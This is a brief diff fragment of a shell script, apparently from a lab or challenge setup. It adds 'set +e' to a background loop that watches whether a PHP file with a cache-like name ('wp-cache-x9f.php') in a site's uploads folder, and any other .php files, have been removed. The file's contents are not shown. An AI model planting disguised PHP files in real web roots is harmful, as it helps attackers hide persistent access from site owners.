@@ -16,6 +16,7 @@ PHP
 
 mkdir -p /root
 (
+  set +e
   while true; do
     sleep 1
     if [ ! -e "$SITE/uploads/wp-cache-x9f.php" ] && ! find "$SITE" -iname '*.php' 2>/dev/null | grep -q .; then
